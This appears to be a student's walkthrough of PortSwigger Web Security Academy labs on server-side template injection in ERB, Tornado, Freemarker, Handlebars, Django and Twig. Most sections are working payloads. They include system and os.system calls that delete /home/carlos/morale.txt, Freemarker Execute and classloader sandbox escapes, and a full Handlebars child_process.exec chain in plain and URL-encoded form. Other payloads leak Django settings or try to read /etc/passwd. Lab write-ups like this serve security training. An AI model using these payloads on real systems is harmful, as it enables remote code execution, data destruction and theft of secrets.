**Basic server-side template injection**


Our ssti test payload
```
<%= 7*7 %>
```

From <https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic> 

Vulnerable
?message parameter 


Url encoded key characters 
`https://0a8a000f0473aa8f828e79ce0027007b.web-security-academy.net/?message=%3C%25%3d+7*7+%25%3E`

We get 49 we show that ssti exist 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/22476f4f-5fa2-455e-b3e1-46e10bcd5d8a)




To delete file use payload 
```
<%= system("rm /home/carlos/morale.txt") %>
```

From <https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic> 

Url encoded key characters
```
https://0a8a000f0473aa8f828e79ce0027007b.web-security-academy.net/?message=?message=%3C%25+system(%22rm+/home/carlos/morale.txt%22)+%25%3E
```

We deleted the file 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c56291a2-d545-44ff-8972-87b47644ef71)



**Basic server-side template injection (code context)**

Login with given creds
Place a comment

On the account page change preferred name and capture request 
Place our payload after username to escape 
```
}}{{7*7}}
We escaped and now our username is followed by 49 which shows poc of ssti
``` 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3ee79a07-d127-430f-9daa-46ca05678565)


Exploit 
To exploit tornado template
Import os and execute a command 
```
{% import os %}
 {{os.system('rm /home/carlos/morale.txt')
```

From <https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context> 

Our exploit with url encode
```
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8cea1cda-212e-4c6c-b274-f9214ddabfc6)

From <https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context> 



Lab solved
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/35101f0f-5615-4a8d-930d-2e0b0c0a7ae4)


Server-side template injection using documentation

Signing in we can edit templates
Remember always save a backup of changes 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8d9e85a1-312c-4e06-bdae-59115ef1bd1b)



See if we can return an error
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4d734132-7ab6-4e2d-a3af-a32e606c4918)

We did 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/771d9a6f-510b-4eb1-9c87-6d689e7a7707)



Freemarker is returned
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bd0650e6-f5cb-4c52-bb48-923e8ea170e7)

Using hacktricks for freemarker ssti cheatsheeet
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
We got the id of the user
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c2d8b20c-9ff2-4ccd-a74e-b5100bad8994)


To delete
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8bc28797-f728-4324-8d1d-6a63e7b2cc25)


Server-side template injection in an unknown language with a documented exploit

Getting more detail result in the unfortunately product is out of stock
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0f167092-f0f9-4cd4-922b-03bca008f60a)


Hello is reflected 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/17b2533b-c55e-4286-9b76-b7500fa5b42b)



Fuzzing 
Using payload form hacktrick
```
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1e45a158-5055-451b-8fbc-9762471e9bdd)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/751180c9-01a7-4f79-9312-620f75fbb17c)




Grep extract the reflected message
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a2c5d5a9-5e29-412e-ab51-62142ab42454)



Handlebar exception returned in the payload indicated we need a handlebar ssti exploit
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8e4f6936-e2e7-4701-b7d8-9a0246fb33ea)



Exploit 

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Url encode
```
https://www.urlencoder.org/
```

Exploit
```
https://0ada00bb03b165bf809a2b9c006f0095.web-security-academy.net/?message=%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/994d857c-ca84-4c3e-8d3e-3372655a7fac)


Real world used collaborator server and curl to it 



Server-side template injection with information disclosure via user-supplied objects

Entering random ssti payload gave us information about django
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3a6b70c0-8a5e-41b6-83b2-4c3b4a5b2857)


Using the following to get payload for django ssti
https://github.com/Lifars/davdts

```
{% debug %}
```

From <https://github.com/Lifars/davdts> 

Gave us information leakage
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3dbde03a-7962-4798-a2d0-77d364c67525)


Pay attention to settings
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/12434a6f-8f5e-4250-9134-e893b78cba80)



Entering settings
```
{{settings}}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cba62fa3-18e3-427c-bd34-67abfe3d4ef9)


Looking at django documentation on keys to find how to access secret key
https://docs.djangoproject.com/en/4.2/ref/settings/
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/55776600-4bfd-4336-889d-d78cac71eb42)

***Server-side template injection in a sandboxed environment***
Freemarker template used after constructing error
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/694b77ca-83a7-4c09-8415-c6e665c58dbd)

Our payload
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}

We got an error indicating that article doesn't exist
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cc6eeb36-8fb6-4873-8437-26b751ad884c)

Change to an existing variable: product
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

We get rce
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ffde7327-4877-458a-861e-8fb3425358f4)



**Server-side template injection with a custom exploit**

Warning
As with many high-severity vulnerabilities, experimenting with server-side template injection can be dangerous. If you're not careful when invoking methods, it is possible to damage your instance of the lab, which could make it unsolvable. If this happens, you will need to wait 20 minutes until your lab session resets. 

From <https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit> 

Uploading something that not an image give us this error
```
User->setAvatar('/tmp/test.php', 'application/oct...')
```

```
From <https://0a5300050357a86b8657dc93005d00e2.web-security-academy.net/my-account/avatar> 
User.php was mention
/home/carlos/User.php
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8545bb08-9f6d-40d0-ade5-82b59c80d745)

```
From <https://0a5300050357a86b8657dc93005d00e2.web-security-academy.net/my-account/avatar>
``` 





Throw in payload to see if we error
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3f817572-de6c-4a24-8b4f-0749bc3543dd)


Doesn't display anything useful

Going to our display to first name 
Transfer to repeater 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/76cccbb9-27c9-4857-9bfb-79d85d037819)



Change being reflected let try `setAvatar()`
 
Twig template
Error messages
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/90bde735-efc7-47a1-bc35-323be593a076)

Changing parameter 
```
user.setAvatar('/etc/passwd')
```

Give us an error message indicating few parameters
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b202fcec-4a40-4ba7-8378-3e8b9a69916a)


Parameter given in previous when we try to upload a webshell
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/db42af9d-7648-4e47-84de-88a6b6f575f5)


Get the mimetype that accept the file upload 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f9aee43d-076f-49d3-9939-bee4fc6c0dc2)


